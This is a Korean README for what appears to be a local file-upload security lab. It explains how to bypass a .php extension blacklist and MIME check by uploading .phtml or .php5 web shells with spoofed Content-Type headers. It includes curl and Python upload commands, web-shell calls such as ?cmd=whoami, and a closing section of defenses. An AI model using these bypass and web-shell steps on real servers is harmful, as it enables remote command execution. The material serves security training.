# 웹셸 우회 기법 샘플

이 디렉토리에는 Level 2를 우회하기 위한 샘플 웹셸 파일들이 포함되어 있습니다.

## 사용 방법

1. `.txt` 확장자를 제거하고 적절한 확장자로 변경
2. 각 파일 내부의 주석을 읽고 우회 기법 이해
3. MIME 타입을 조작하여 업로드

## Level 2 우회 샘플

Level 2는 다음을 검증합니다:
- ❌ `.php` 확장자 차단
- ❌ MIME 타입에 `php` 문자열 포함 시 차단

### 1. level2-phtml.phtml
- **우회 기법**: .phtml 확장자 + MIME 타입 조작
- **설명**: .php 대신 .phtml 사용하고, Content-Type을 image/jpeg로 변경
- **함수**: `system()` 사용

### 2. level2-php5.php5
- **우회 기법**: .php5 확장자 + MIME 타입 조작
- **설명**: .php 대신 .php5 사용하고, Content-Type을 text/plain으로 변경
- **함수**: `shell_exec()` 사용

### 3. level2-backtick.phtml
- **우회 기법**: .phtml 확장자 + 백틱 연산자
- **설명**: 백틱 연산자(`)로 명령 실행
- **특징**: 함수 호출 없이 명령 실행 가능

## MIME 타입 조작 방법

Level 2에서는 MIME 타입에 'php'가 포함되면 차단되므로 조작이 필요합니다.

### 방법 1: Burp Suite 사용

1. Burp Suite Proxy 실행
2. 브라우저 프록시 설정 (127.0.0.1:8080)
3. 파일 업로드 시도
4. Burp에서 요청 가로채기 (Intercept)
5. `Content-Type: application/x-httpd-php` 또는 유사한 값을
   - `Content-Type: image/jpeg`
   - `Content-Type: image/png`
   - `Content-Type: text/plain`
   등으로 변경
6. Forward 클릭

### 방법 2: curl 명령 사용

```bash
# .phtml 파일 업로드
curl -X POST \
  -F "level=2" \
  -F "file=@shell.phtml;type=image/jpeg" \
  http://localhost:8080/upload.php

# .php5 파일 업로드
curl -X POST \
  -F "level=2" \
  -F "file=@shell.php5;type=text/plain" \
  http://localhost:8080/upload.php
```

### 방법 3: Python 스크립트 사용

```python
import requests

# 파일 이름 변경
with open('shell.phtml', 'rb') as f:
    files = {
        'file': ('shell.phtml', f, 'image/jpeg')  # MIME 타입 조작
    }
    data = {'level': '2'}

    response = requests.post(
        'http://localhost:8080/upload.php',
        files=files,
        data=data
    )
    print(response.text)
```

## 실습 예제

### 예제 1: .phtml 파일로 우회

```bash
# 1. 샘플 파일 준비
cp level2-phtml.phtml.txt shell.phtml

# 2. Burp Suite 없이 curl로 바로 업로드
curl -X POST \
  -F "level=2" \
  -F "file=@shell.phtml;type=image/jpeg" \
  http://localhost:8080/upload.php

# 3. 접근
curl "http://localhost:8080/uploads/shell.phtml?cmd=ls"
```

### 예제 2: .php5 파일로 우회

```bash
# 1. 샘플 파일 준비
cp level2-php5.php5.txt shell.php5

# 2. 업로드 (MIME 타입을 text/plain으로)
curl -X POST \
  -F "level=2" \
  -F "file=@shell.php5;type=text/plain" \
  http://localhost:8080/upload.php

# 3. 접근
curl "http://localhost:8080/uploads/shell.php5?cmd=whoami"
```

## 왜 이 우회가 가능한가?

### 확장자 검증의 취약점
- 서버는 `.php` 확장자만 차단
- 하지만 Nginx/Apache는 `.phtml`, `.php5` 등도 PHP로 실행
- **교훈**: 확장자 블랙리스트는 불완전함

### MIME 타입 검증의 취약점
- MIME 타입은 클라이언트(브라우저)가 보내는 값
- HTTP 요청을 가로채서 쉽게 조작 가능
- 서버는 이 값을 신뢰해서는 안 됨
- **교훈**: 클라이언트가 보내는 데이터는 신뢰할 수 없음

## 보안 대책

실제 환경에서는 다음과 같이 방어해야 합니다:

### 1. 확장자 화이트리스트
```php
// 나쁜 예 (블랙리스트)
if ($ext === 'php') { die('차단'); }

// 좋은 예 (화이트리스트)
$allowed = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
if (!in_array($ext, $allowed)) { die('허용되지 않음'); }
```

### 2. 실제 파일 내용 검증
```php
// 이미지 파일인지 실제로 확인
$image_info = getimagesize($tmp_file);
if ($image_info === false) {
    die('유효한 이미지 파일이 아닙니다');
}
```

### 3. 파일명 무작위화
```php
// 원본 파일명 사용 X
$new_name = bin2hex(random_bytes(16)) . '.jpg';
```

### 4. 업로드 디렉토리에서 실행 차단
```nginx
# Nginx 설정
location ~* ^/uploads/.*\.(php|phtml|php3|php4|php5)$ {
    deny all;
}
```

### 5. 웹 루트 외부에 저장
```php
// 웹에서 직접 접근 불가능한 위치
$upload_dir = '/var/data/uploads/';
// 다운로드는 별도 스크립트로 제공
```

## 핵심 교훈

1. **클라이언트 데이터는 신뢰할 수 없다**
   - MIME 타입, 파일명, 확장자 모두 조작 가능

2. **블랙리스트는 불완전하다**
   - 허용할 것을 명시하는 화이트리스트 방식이 안전

3. **다층 방어가 필요하다**
   - 확장자 검증 + 내용 검증 + 실행 차단을 모두 적용

4. **파일 실행을 원천적으로 차단**
   - 업로드 디렉토리에서는 스크립트 실행을 아예 막는 것이 가장 안전
